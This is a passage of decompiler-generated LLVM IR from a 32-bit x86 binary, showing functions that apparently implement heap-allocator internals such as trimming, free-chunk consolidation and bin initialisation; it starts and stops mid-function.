  uselistorder i32 (i32)* @function_80504e4, { 1, 13, 12, 0, 9, 11, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 8, 7, 6, 5, 4, 3, 2, 10 }
  uselistorder label %dec_label_pc_805106a, { 1, 0 }
  uselistorder label %dec_label_pc_8051067, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051059, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8051051, { 1, 0 }
  uselistorder label %dec_label_pc_805104c, { 1, 0 }
  uselistorder label %dec_label_pc_8051008, { 1, 0 }
  uselistorder label %dec_label_pc_8050ff5, { 1, 0 }
  uselistorder label %dec_label_pc_8050f7d, { 1, 0 }
  uselistorder label %dec_label_pc_8050f30, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050f1c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8050e75, { 1, 0 }
  uselistorder label %dec_label_pc_8050dd5, { 1, 0 }
}

define i32 @function_8051074() local_unnamed_addr {
dec_label_pc_8051074:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_805107b = load i32, i32* @edx, align 4
  store i32 %v0_805107b, i32* %ebp.global-to-local, align 4
  %v1_805107d = add i32 %v0_805107b, 860
  %v2_805107d = inttoptr i32 %v1_805107d to i32*
  %v3_805107d = load i32, i32* %v2_805107d, align 4
  store i32 %v3_805107d, i32* %ecx.global-to-local, align 4
  %v1_8051083 = add i32 %v0_805107b, 44
  %v2_8051083 = inttoptr i32 %v1_8051083 to i32*
  %v3_8051083 = load i32, i32* %v2_8051083, align 4
  %v1_8051086 = add i32 %v3_8051083, 4
  %v2_8051086 = inttoptr i32 %v1_8051086 to i32*
  %v3_8051086 = load i32, i32* %v2_8051086, align 4
  %v1_8051089 = and i32 %v3_8051086, -4
  store i32 %v1_8051089, i32* @esi, align 4
  %v1_805108e = load i32, i32* @eax, align 4
  %v2_805108e = add i32 %v3_805107d, -17
  %v2_8051090 = add i32 %v2_805108e, %v1_8051089
  %v3_8051090 = sub i32 %v2_8051090, %v1_805108e
  %div = udiv i32 %v3_8051090, %v3_805107d
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8051090, %v3_805107d
  store i32 %tmp10, i32* @edx, align 4
  %v1_8051098 = add i32 %div, -1
  %v4_805109b = mul i32 %v1_8051098, %v3_805107d
  store i32 %v4_805109b, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_805109b, 1
  br i1 %tmp11, label %dec_label_pc_80510f7, label %dec_label_pc_80510a2

dec_label_pc_80510a2:                             ; preds = %dec_label_pc_8051074
  %v1_80510a7 = call i32 @function_80521d9(i32 0)
  store i32 %v1_80510a7, i32* %edi.global-to-local, align 4
  %v0_80510ae = load i32, i32* @esi, align 4
  store i32 %v0_80510ae, i32* %eax.global-to-local, align 4
  %v1_80510b0 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80510b0 = add i32 %v1_80510b0, 44
  %v3_80510b0 = inttoptr i32 %v2_80510b0 to i32*
  %v4_80510b0 = load i32, i32* %v3_80510b0, align 4
  %v5_80510b0 = add i32 %v4_80510b0, %v0_80510ae
  store i32 %v5_80510b0, i32* %eax.global-to-local, align 4
  %v12_80510b6 = icmp eq i32 %v1_80510a7, %v5_80510b0
  %v1_80510b8 = icmp eq i1 %v12_80510b6, false
  br i1 %v1_80510b8, label %dec_label_pc_80510f7, label %dec_label_pc_80510ba

dec_label_pc_80510ba:                             ; preds = %dec_label_pc_80510a2
  %v1_80510bd = sub i32 0, %v4_805109b
  store i32 %v1_80510bd, i32* @ebx, align 4
  %v1_80510c0 = call i32 @function_80521d9(i32 %v1_80510bd)
  store i32 %v1_80510c0, i32* %eax.global-to-local, align 4
  %v1_80510cc = call i32 @function_80521d9(i32 0)
  store i32 %v1_80510cc, i32* %eax.global-to-local, align 4
  %v10_80510d4 = icmp eq i32 %v1_80510cc, -1
  br i1 %v10_80510d4, label %dec_label_pc_80510f7, label %dec_label_pc_80510d9

dec_label_pc_80510d9:                             ; preds = %dec_label_pc_80510ba
  %v0_80510d9 = load i32, i32* %edi.global-to-local, align 4
  %v2_80510db = sub i32 %v0_80510d9, %v1_80510cc
  %v12_80510db = icmp eq i32 %v2_80510db, 0
  store i32 %v2_80510db, i32* %ecx.global-to-local, align 4
  br i1 %v12_80510db, label %dec_label_pc_80510f7, label %dec_label_pc_80510df

dec_label_pc_80510df:                             ; preds = %dec_label_pc_80510d9
  %v0_80510df = load i32, i32* %ebp.global-to-local, align 4
  %v1_80510df = add i32 %v0_80510df, 44
  %v2_80510df = inttoptr i32 %v1_80510df to i32*
  %v3_80510df = load i32, i32* %v2_80510df, align 4
  store i32 %v3_80510df, i32* %eax.global-to-local, align 4
  %v1_80510e2 = add i32 %v0_80510df, 872
  %v2_80510e2 = inttoptr i32 %v1_80510e2 to i32*
  %v3_80510e2 = load i32, i32* %v2_80510e2, align 4
  %v5_80510e2 = sub i32 %v3_80510e2, %v2_80510db
  store i32 %v5_80510e2, i32* %v2_80510e2, align 4
  %v0_80510e8 = load i32, i32* @esi, align 4
  %v1_80510e8 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80510e8 = sub i32 %v0_80510e8, %v1_80510e8
  %v1_80510ea = or i32 %v2_80510e8, 1
  %v1_80510ed = load i32, i32* %eax.global-to-local, align 4
  %v2_80510ed = add i32 %v1_80510ed, 4
  %v3_80510ed = inttoptr i32 %v2_80510ed to i32*
  store i32 %v1_80510ea, i32* %v3_80510ed, align 4
  br label %dec_label_pc_80510f9

dec_label_pc_80510f7:                             ; preds = %dec_label_pc_80510d9, %dec_label_pc_80510ba, %dec_label_pc_80510a2, %dec_label_pc_8051074
  br label %dec_label_pc_80510f9

dec_label_pc_80510f9:                             ; preds = %dec_label_pc_80510df, %dec_label_pc_80510f7
  %storemerge = phi i32 [ 1, %dec_label_pc_80510df ], [ 0, %dec_label_pc_80510f7 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80510cc, { 1, 0, 2 }
  uselistorder i32 %v4_805109b, { 1, 2, 0 }
  uselistorder i32 %v3_805107d, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_80521d9, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80510f9, { 1, 0 }
}

define i32 @function_8051101(i32* %arg1) local_unnamed_addr {
dec_label_pc_8051101:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_8051102 = load i32, i32* @edi, align 4
  %v0_8051103 = load i32, i32* @esi, align 4
  %v0_8051104 = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_805110c = load i32, i32* %arg1, align 4
  store i32 %v2_805110c, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8051113 = icmp eq i32 %v2_805110c, 0
  br i1 %v1_8051113, label %dec_label_pc_805122d.lr.ph, label %dec_label_pc_805111b

dec_label_pc_805122d.lr.ph:                       ; preds = %dec_label_pc_8051101
  %v3_8051231 = add i32 %tmp20, 44
  br label %dec_label_pc_805122d

dec_label_pc_805111b:                             ; preds = %dec_label_pc_8051101
  %v1_805111f = and i32 %v2_805110c, -3
  store i32 %v1_805111f, i32* %arg1, align 4
  %v1_8051124 = add i32 %tmp20, 52
  store i32 %tmp20, i32* @edx, align 4
  %v1_805112f = add i32 %tmp20, 4
  store i32 %v1_805112f, i32* %eax.global-to-local, align 4
  %v2_805113a = load i32, i32* %arg1, align 4
  %v2_8051140 = udiv i32 %v2_805113a, 8
  %v2_8051143 = mul nuw i32 %v2_8051140, 4
  %v3_8051143 = add i32 %tmp20, -4
  %v4_8051143 = add i32 %v3_8051143, %v2_8051143
  store i32 %v4_8051143, i32* %eax.global-to-local, align 4
  %v2_805120a = add i32 %tmp20, 44
  %v3_805120a = inttoptr i32 %v2_805120a to i32*
  %v1_80511dd = add i32 %tmp20, 60
  %v2_80511dd = inttoptr i32 %v1_80511dd to i32*
  br label %dec_label_pc_805114b

dec_label_pc_805114b:                             ; preds = %dec_label_pc_8051223, %dec_label_pc_805111b
  %v0_8051159 = phi i32 [ %v1_805112f, %dec_label_pc_805111b ], [ %v4_8051223, %dec_label_pc_8051223 ]
  store i32 %v0_8051159, i32* %eax.global-to-local, align 4
  %v1_805114f = inttoptr i32 %v0_8051159 to i32*
  %v2_805114f = load i32, i32* %v1_805114f, align 4
  store i32 %v2_805114f, i32* @ecx, align 4
  %v1_8051151 = icmp eq i32 %v2_805114f, 0
  br i1 %v1_8051151, label %dec_label_pc_8051219, label %dec_label_pc_8051159

dec_label_pc_8051159:                             ; preds = %dec_label_pc_805114b
  store i32 0, i32* %v1_805114f, align 4
  %v0_805115f.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805115f

dec_label_pc_805115f:                             ; preds = %dec_label_pc_805120d, %dec_label_pc_8051159
  %v0_805117c = phi i32 [ %v3_805115f, %dec_label_pc_805120d ], [ %v0_805115f.pre, %dec_label_pc_8051159 ]
  %v1_805115f = add i32 %v0_805117c, 8
  %v2_805115f = inttoptr i32 %v1_805115f to i32*
  %v3_805115f = load i32, i32* %v2_805115f, align 4
  store i32 %v3_805115f, i32* %edx.global-to-local, align 4
  %v1_8051166 = add i32 %v0_805117c, 4
  %v2_8051166 = inttoptr i32 %v1_8051166 to i32*
  %v3_8051166 = load i32, i32* %v2_8051166, align 4
  store i32 %v3_8051166, i32* %eax.global-to-local, align 4
  %v1_805116b = and i32 %v3_8051166, -2
  store i32 %v1_805116b, i32* @edi, align 4
  %v2_805116e = urem i32 %v3_8051166, 2
  %v3_805116e = icmp eq i32 %v2_805116e, 0
  %v2_8051170 = add i32 %v1_805116b, %v0_805117c
  store i32 %v2_8051170, i32* @ebx, align 4
  %v1_8051173 = add i32 %v2_8051170, 4
  %v2_8051173 = inttoptr i32 %v1_8051173 to i32*
  %v3_8051173 = load i32, i32* %v2_8051173, align 4
  store i32 %v3_8051173, i32* %edx.global-to-local, align 4
  %v1_805117a = icmp eq i1 %v3_805116e, false
  br i1 %v1_805117a, label %dec_label_pc_805119c, label %dec_label_pc_805117c

dec_label_pc_805117c:                             ; preds = %dec_label_pc_805115f
  %v1_805117c = inttoptr i32 %v0_805117c to i32*
  %v2_805117c = load i32, i32* %v1_805117c, align 4
  store i32 %v2_805117c, i32* %ebp.global-to-local, align 4
  %v2_8051180 = sub i32 %v0_805117c, %v2_805117c
  store i32 %v2_8051180, i32* %eax.global-to-local, align 4
  %v1_8051182 = add i32 %v2_8051180, 8
  %v2_8051182 = inttoptr i32 %v1_8051182 to i32*
  %v3_8051182 = load i32, i32* %v2_8051182, align 4
  store i32 %v3_8051182, i32* @esi, align 4
  %v1_8051185 = add i32 %v2_8051180, 12
  %v2_8051185 = inttoptr i32 %v1_8051185 to i32*
  %v3_8051185 = load i32, i32* %v2_8051185, align 4
  store i32 %v3_8051185, i32* %edx.global-to-local, align 4
  %v1_8051188 = add i32 %v3_8051182, 12
  %v2_8051188 = inttoptr i32 %v1_8051188 to i32*
  %v3_8051188 = load i32, i32* %v2_8051188, align 4
  store i32 %v3_8051188, i32* @ecx, align 4
  %v12_805118b = icmp eq i32 %v3_8051188, %v2_8051180
  %v1_805118d = icmp eq i1 %v12_805118b, false
  br i1 %v1_805118d, label %dec_label_pc_80511cc, label %dec_label_pc_805118f

dec_label_pc_805118f:                             ; preds = %dec_label_pc_805117c
  %v1_805118f = add i32 %v3_8051185, 8
  %v2_805118f = inttoptr i32 %v1_805118f to i32*
  %v3_805118f = load i32, i32* %v2_805118f, align 4
  %v15_805118f = icmp eq i32 %v3_805118f, %v3_8051188
  %v1_8051192 = icmp eq i1 %v15_805118f, false
  br i1 %v1_8051192, label %dec_label_pc_80511cc, label %dec_label_pc_8051194

dec_label_pc_8051194:                             ; preds = %dec_label_pc_805118f
  %v2_8051194 = add i32 %v2_805117c, %v1_805116b
  store i32 %v2_8051194, i32* @edi, align 4
  store i32 %v3_8051185, i32* %v2_8051188, align 4
  %v0_8051199 = load i32, i32* @esi, align 4
  %v1_8051199 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051199 = add i32 %v1_8051199, 8
  %v3_8051199 = inttoptr i32 %v2_8051199 to i32*
  store i32 %v0_8051199, i32* %v3_8051199, align 4
  %v0_80511a7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805119c

dec_label_pc_805119c:                             ; preds = %dec_label_pc_805115f, %dec_label_pc_8051194
  %v1_80511b0 = phi i32 [ %v2_8051170, %dec_label_pc_805115f ], [ %v0_80511a7.pre, %dec_label_pc_8051194 ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_80511a4 = and i32 %v3_8051173, -4
  store i32 %v1_80511a4, i32* %ebp.global-to-local, align 4
  %v4_80511a7 = load i32, i32* %v3_805120a, align 4
  %v15_80511a7 = icmp eq i32 %v1_80511b0, %v4_80511a7
  br i1 %v15_80511a7, label %dec_label_pc_80511fd, label %dec_label_pc_80511ac

dec_label_pc_80511ac:                             ; preds = %dec_label_pc_805119c
  %v2_80511ac = add i32 %v1_80511b0, 4
  %v3_80511ac = add i32 %v2_80511ac, %v1_80511a4
  %v4_80511ac = inttoptr i32 %v3_80511ac to i32*
  %v5_80511ac = load i32, i32* %v4_80511ac, align 4
  store i32 %v5_80511ac, i32* %eax.global-to-local, align 4
  %v3_80511b0 = inttoptr i32 %v2_80511ac to i32*
  store i32 %v1_80511a4, i32* %v3_80511b0, align 4
  %v0_80511b3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80511b3 = urem i32 %v0_80511b3, 2
  %v2_80511b3 = icmp eq i32 %v1_80511b3, 0
  store i32 %v1_80511b3, i32* %eax.global-to-local, align 4
  %v1_80511b8 = icmp eq i1 %v2_80511b3, false
  br i1 %v1_80511b8, label %dec_label_pc_80511d9, label %dec_label_pc_80511ba

dec_label_pc_80511ba:                             ; preds = %dec_label_pc_80511ac
  %v0_80511ba = load i32, i32* @ebx, align 4
  %v1_80511ba = add i32 %v0_80511ba, 8
  %v2_80511ba = inttoptr i32 %v1_80511ba to i32*
  %v3_80511ba = load i32, i32* %v2_80511ba, align 4
  store i32 %v3_80511ba, i32* @edx, align 4
  %v1_80511bd = add i32 %v0_80511ba, 12
  %v2_80511bd = inttoptr i32 %v1_80511bd to i32*
  %v3_80511bd = load i32, i32* %v2_80511bd, align 4
  store i32 %v3_80511bd, i32* %eax.global-to-local, align 4
  %v1_80511c0 = add i32 %v3_80511ba, 12
  %v2_80511c0 = inttoptr i32 %v1_80511c0 to i32*
  %v3_80511c0 = load i32, i32* %v2_80511c0, align 4
  store i32 %v3_80511c0, i32* @esi, align 4
  %v12_80511c3 = icmp eq i32 %v3_80511c0, %v0_80511ba
  %v1_80511c5 = icmp eq i1 %v12_80511c3, false
  br i1 %v1_80511c5, label %dec_label_pc_80511cc, label %dec_label_pc_80511c7

dec_label_pc_80511c7:                             ; preds = %dec_label_pc_80511ba
  %v1_80511c7 = add i32 %v3_80511bd, 8
  %v2_80511c7 = inttoptr i32 %v1_80511c7 to i32*
  %v3_80511c7 = load i32, i32* %v2_80511c7, align 4
  %v15_80511c7 = icmp eq i32 %v3_80511c7, %v3_80511c0
  br i1 %v15_80511c7, label %dec_label_pc_80511d1, label %dec_label_pc_80511cc

dec_label_pc_80511cc:                             ; preds = %dec_label_pc_80511c7, %dec_label_pc_80511ba, %dec_label_pc_805118f, %dec_label_pc_805117c
  %v0_80511cc = call i32 @function_8051445()
  store i32 %v0_80511cc, i32* %eax.global-to-local, align 4
  %v1_80511d3.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80511d1

dec_label_pc_80511d1:                             ; preds = %dec_label_pc_80511c7, %dec_label_pc_80511cc
  %v1_80511d3 = phi i32 [ %v3_80511ba, %dec_label_pc_80511c7 ], [ %v1_80511d3.pre, %dec_label_pc_80511cc ]
  %v0_80511d3 = phi i32 [ %v3_80511bd, %dec_label_pc_80511c7 ], [ %v0_80511cc, %dec_label_pc_80511cc ]
  %v0_80511d1 = load i32, i32* @edi, align 4
  %v1_80511d1 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80511d1 = add i32 %v1_80511d1, %v0_80511d1
  store i32 %v2_80511d1, i32* @edi, align 4
  %v2_80511d3 = add i32 %v1_80511d3, 12
  %v3_80511d3 = inttoptr i32 %v2_80511d3 to i32*
  store i32 %v0_80511d3, i32* %v3_80511d3, align 4
  %v0_80511d6 = load i32, i32* @edx, align 4
  %v1_80511d6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80511d6 = add i32 %v1_80511d6, 8
  %v3_80511d6 = inttoptr i32 %v2_80511d6 to i32*
  store i32 %v0_80511d6, i32* %v3_80511d6, align 4
  br label %dec_label_pc_80511d9

dec_label_pc_80511d9:                             ; preds = %dec_label_pc_80511ac, %dec_label_pc_80511d1
  store i32 %v1_8051124, i32* %eax.global-to-local, align 4
  %v3_80511dd = load i32, i32* %v2_80511dd, align 4
  store i32 %v3_80511dd, i32* @edx, align 4
  %v0_80511e0 = load i32, i32* @ecx, align 4
  store i32 %v0_80511e0, i32* %v2_80511dd, align 4
  %v0_80511e3 = load i32, i32* @edi, align 4
  %v1_80511e5 = or i32 %v0_80511e3, 1
  store i32 %v1_80511e5, i32* %eax.global-to-local, align 4
  %v0_80511e8 = load i32, i32* @ecx, align 4
  %v1_80511e8 = load i32, i32* @edx, align 4
  %v2_80511e8 = add i32 %v1_80511e8, 12
  %v3_80511e8 = inttoptr i32 %v2_80511e8 to i32*
  store i32 %v0_80511e8, i32* %v3_80511e8, align 4
  %v0_80511eb = load i32, i32* %eax.global-to-local, align 4
  %v1_80511eb = load i32, i32* @ecx, align 4
  %v2_80511eb = add i32 %v1_80511eb, 4
  %v3_80511eb = inttoptr i32 %v2_80511eb to i32*
  store i32 %v0_80511eb, i32* %v3_80511eb, align 4
  store i32 %v1_8051124, i32* %eax.global-to-local, align 4
  %v0_80511f2 = load i32, i32* @edx, align 4
  %v1_80511f2 = load i32, i32* @ecx, align 4
  %v2_80511f2 = add i32 %v1_80511f2, 8
  %v3_80511f2 = inttoptr i32 %v2_80511f2 to i32*
  store i32 %v0_80511f2, i32* %v3_80511f2, align 4
  %v0_80511f5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80511f5 = load i32, i32* @ecx, align 4
  %v2_80511f5 = add i32 %v1_80511f5, 12
  %v3_80511f5 = inttoptr i32 %v2_80511f5 to i32*
  store i32 %v0_80511f5, i32* %v3_80511f5, align 4
  %v0_80511f8 = load i32, i32* @edi, align 4
  %v1_80511f8 = load i32, i32* @ecx, align 4
  %v3_80511f8 = add i32 %v1_80511f8, %v0_80511f8
  %v4_80511f8 = inttoptr i32 %v3_80511f8 to i32*
  store i32 %v0_80511f8, i32* %v4_80511f8, align 4
  br label %dec_label_pc_805120d

dec_label_pc_80511fd:                             ; preds = %dec_label_pc_805119c
  %v0_80511fd = load i32, i32* @edi, align 4
  %v2_80511fd = add i32 %v0_80511fd, %v1_80511a4
  %v1_8051200 = or i32 %v2_80511fd, 1
  store i32 %v1_8051200, i32* %eax.global-to-local, align 4
  %v1_8051203 = load i32, i32* @ecx, align 4
  %v2_8051203 = add i32 %v1_8051203, 4
  %v3_8051203 = inttoptr i32 %v2_8051203 to i32*
  store i32 %v1_8051200, i32* %v3_8051203, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v0_805120a = load i32, i32* @ecx, align 4
  store i32 %v0_805120a, i32* %v3_805120a, align 4
  br label %dec_label_pc_805120d

dec_label_pc_805120d:                             ; preds = %dec_label_pc_80511d9, %dec_label_pc_80511fd
  store i32 %v3_805115f, i32* @ecx, align 4
  %v1_8051211 = icmp eq i32 %v3_805115f, 0
  %v1_8051213 = icmp eq i1 %v1_8051211, false
  br i1 %v1_8051213, label %dec_label_pc_805115f, label %dec_label_pc_8051219

dec_label_pc_8051219:                             ; preds = %dec_label_pc_805120d, %dec_label_pc_805114b
  %v15_805121d = icmp eq i32 %v0_8051159, %v4_8051143
  br i1 %v15_805121d, label %dec_label_pc_80512a1, label %dec_label_pc_8051223

dec_label_pc_8051223:                             ; preds = %dec_label_pc_8051219
  %v4_8051223 = add i32 %v0_8051159, 4
  br label %dec_label_pc_805114b

dec_label_pc_805122d:                             ; preds = %dec_label_pc_805122d.lr.ph, %dec_label_pc_805122d
  %v1_8051231 = phi i32 [ 1, %dec_label_pc_805122d.lr.ph ], [ %v0_805123c, %dec_label_pc_805122d ]
  %v2_8051231 = mul i32 %v1_8051231, 8
  %v4_8051231 = add i32 %v3_8051231, %v2_8051231
  store i32 %v4_8051231, i32* %eax.global-to-local, align 4
  %v1_8051235 = add i32 %v1_8051231, 1
  store i32 %v1_8051235, i32* %edx.global-to-local, align 4
  %v2_8051236 = add i32 %v4_8051231, 12
  %v3_8051236 = inttoptr i32 %v2_8051236 to i32*
  store i32 %v4_8051231, i32* %v3_8051236, align 4
  %v0_8051239 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051239 = add i32 %v0_8051239, 8
  %v3_8051239 = inttoptr i32 %v2_8051239 to i32*
  store i32 %v0_8051239, i32* %v3_8051239, align 4
  %v0_805123c = load i32, i32* %edx.global-to-local, align 4
  %v7_805123f = icmp sgt i32 %v0_805123c, 95
  br i1 %v7_805123f, label %dec_label_pc_8051241, label %dec_label_pc_805122d

dec_label_pc_8051241:                             ; preds = %dec_label_pc_805122d
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_8051245 = add i32 %tmp20, 864
  %v2_8051245 = inttoptr i32 %v1_8051245 to i32*
  %v3_8051245 = load i32, i32* %v2_8051245, align 4
  %v4_8051245 = or i32 %v3_8051245, 1
  store i32 %v4_8051245, i32* %v2_8051245, align 4
  %v0_805124c = load i32, i32* %eax.global-to-local, align 4
  %v1_805124c = add i32 %v0_805124c, 840
  %v2_805124c = inttoptr i32 %v1_805124c to i32*
  store i32 0, i32* %v2_805124c, align 4
  %v0_8051256 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051256 = add i32 %v0_8051256, 852
  %v2_8051256 = inttoptr i32 %v1_8051256 to i32*
  store i32 65536, i32* %v2_8051256, align 4
  %v0_8051260 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051260 = add i32 %v0_8051260, 844
  %v2_8051260 = inttoptr i32 %v1_8051260 to i32*
  store i32 262144, i32* %v2_8051260, align 4
  %v0_805126a = load i32, i32* %eax.global-to-local, align 4
  %v1_805126a = add i32 %v0_805126a, 836
  %v2_805126a = inttoptr i32 %v1_805126a to i32*
  store i32 262144, i32* %v2_805126a, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v2_805127b = load i32, i32* %arg1, align 4
  %v1_805127d = urem i32 %v2_805127b, 4
  %v1_8051280 = or i32 %v1_805127d, 72
  store i32 %v1_8051280, i32* %arg1, align 4
  %v0_8051285 = load i32, i32* @edx, align 4
  %v1_8051287 = add i32 %v0_8051285, 52
  store i32 %v1_8051287, i32* %eax.global-to-local, align 4
  %v2_805128a = add i32 %v0_8051285, 44
  %v3_805128a = inttoptr i32 %v2_805128a to i32*
  store i32 %v1_8051287, i32* %v3_805128a, align 4
  %v1_805128f = call i32 @function_8051889(i32 30)
  store i32 %v1_805128f, i32* %eax.global-to-local, align 4
  %v2_805129b = add i32 %tmp20, 860
  %v3_805129b = inttoptr i32 %v2_805129b to i32*
  store i32 %v1_805128f, i32* %v3_805129b, align 4
  br label %dec_label_pc_80512a1

dec_label_pc_80512a1:                             ; preds = %dec_label_pc_8051219, %dec_label_pc_8051241
  store i32 %v0_8051104, i32* @ebx, align 4
  store i32 %v0_8051103, i32* @esi, align 4
  store i32 %v0_8051102, i32* @edi, align 4
  %v0_80512a8 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80512a8

; uselistorder directives
  uselistorder i32 %v0_805123c, { 1, 0 }
  uselistorder i32 %v0_8051239, { 1, 0 }
  uselistorder i32 %v1_8051231, { 1, 0 }
  uselistorder i32 %v0_80511f8, { 1, 0 }
  uselistorder i32 %v1_80511b3, { 1, 0 }
  uselistorder i32 %v2_80511ac, { 1, 0 }
  uselistorder i32 %v1_80511a4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80511b0, { 1, 0 }
  uselistorder i32 %v3_805115f, { 2, 1, 3, 0 }
  uselistorder i32 %v0_805117c, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8051159, { 1, 0, 3, 2 }
  uselistorder i32* %v3_805120a, { 1, 0 }
  uselistorder i32 %v1_8051124, { 1, 0 }
  uselistorder i32 %tmp20, { 3, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_80512a1, { 1, 0 }
  uselistorder label %dec_label_pc_805122d, { 1, 0 }
  uselistorder label %dec_label_pc_805120d, { 1, 0 }
  uselistorder label %dec_label_pc_80511d9, { 1, 0 }
  uselistorder label %dec_label_pc_80511d1, { 1, 0 }
  uselistorder label %dec_label_pc_805119c, { 1, 0 }
}

define i32 @function_80512a9(i32 %arg1) local_unnamed_addr {
dec_label_pc_80512a9:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80512a9 = load i32, i32* @ebp, align 4
  %v0_80512aa = load i32, i32* @edi, align 4
  %v0_80512ab = load i32, i32* @esi, align 4
  %v0_80512ac = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80512b4 = icmp eq i32 %arg1, 0
  br i1 %v1_80512b4, label %dec_label_pc_805143d, label %dec_label_pc_80512bc

dec_label_pc_80512bc:                             ; preds = %dec_label_pc_80512a9
  %v2_80512c7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80512c7, i32* @eax, align 4
  %v2_80512cc = call i32 @function_8051a10(i32 %v2_80512c7, i32 134552077)
  store i32 %v2_80512cc, i32* %eax.global-to-local, align 4
  %v1_80512d8 = call i32 @function_8051a0d(i32 ptrtoint (i32* @global_var_805303c.187 to i32))
  %v1_80512dd = add i32 %arg1, -8
  store i32 %v1_80512dd, i32* @ecx, align 4
  %v0_80512e0 = load i8, i8* @global_var_8053340.188, align 1
  %v1_80512e0 = sext i8 %v0_80512e0 to i32
  store i32 %v1_80512e0, i32* %eax.global-to-local, align 4
  %v1_80512e8 = add i32 %arg1, -4
  %v2_80512e8 = inttoptr i32 %v1_80512e8 to i32*
  %v3_80512e8 = load i32, i32* %v2_80512e8, align 4
  %v1_80512ed = and i32 %v3_80512e8, -4
  %v4_80512ed = trunc i32 %v1_80512ed to i8
  store i32 %v1_80512ed, i32* @ebx, align 4
  %v8_80512f2 = icmp ugt i8 %v4_80512ed, %v0_80512e0
  br i1 %v8_80512f2, label %dec_label_pc_8051314, label %dec_label_pc_80512f4

dec_label_pc_80512f4:                             ; preds = %dec_label_pc_80512bc
  %v2_80512f4 = udiv i32 %v3_80512e8, 8
  %v1_80512f7 = or i32 %v1_80512e0, 3
  %v3_80512f7 = trunc i32 %v1_80512f7 to i8
  store i32 %v1_80512f7, i32* %eax.global-to-local, align 4
  store i8 %v3_80512f7, i8* @global_var_8053340.188, align 64
  %v1_80512ff = mul nuw i32 %v2_80512f4, 4
  %v2_80512ff = add i32 %v1_80512ff, ptrtoint (i8* @global_var_8053340.188 to i32)
  store i32 %v2_80512ff, i32* @edx, align 4
  %v1_8051306 = add i32 %v1_80512ff, add (i32 ptrtoint (i8* @global_var_8053340.188 to i32), i32 -4)
  %v2_8051306 = inttoptr i32 %v1_8051306 to i32*
  %v3_8051306 = load i32, i32* %v2_8051306, align 4
  store i32 %v3_8051306, i32* %eax.global-to-local, align 4
  %v3_8051309 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8051306, i32* %v3_8051309, align 4
  %v0_805130c = load i32, i32* @ecx, align 4
  %v1_805130c = load i32, i32* @edx, align 4
  %v2_805130c = add i32 %v1_805130c, -4
  %v3_805130c = inttoptr i32 %v2_805130c to i32*
  store i32 %v0_805130c, i32* %v3_805130c, align 4
  br label %dec_label_pc_805142c

dec_label_pc_8051314:                             ; preds = %dec_label_pc_80512bc
  %v1_8051314 = trunc i32 %v3_80512e8 to i8
  %v2_8051314 = and i8 %v1_8051314, 2
  %v3_8051314 = icmp eq i8 %v2_8051314, 0
  %v5_8051314 = zext i8 %v2_8051314 to i32
  %v7_8051314 = and i32 %v3_80512e8, -256
  %v8_8051314 = or i32 %v5_8051314, %v7_8051314
  store i32 %v8_8051314, i32* @edx, align 4
  %v1_8051317 = icmp eq i1 %v3_8051314, false
  br i1 %v1_8051317, label %dec_label_pc_805140c, label %dec_label_pc_805131d

dec_label_pc_805131d:                             ; preds = %dec_label_pc_8051314
  %v1_805131d = or i32 %v1_80512e0, 1
  %v3_805131d = trunc i32 %v1_805131d to i8
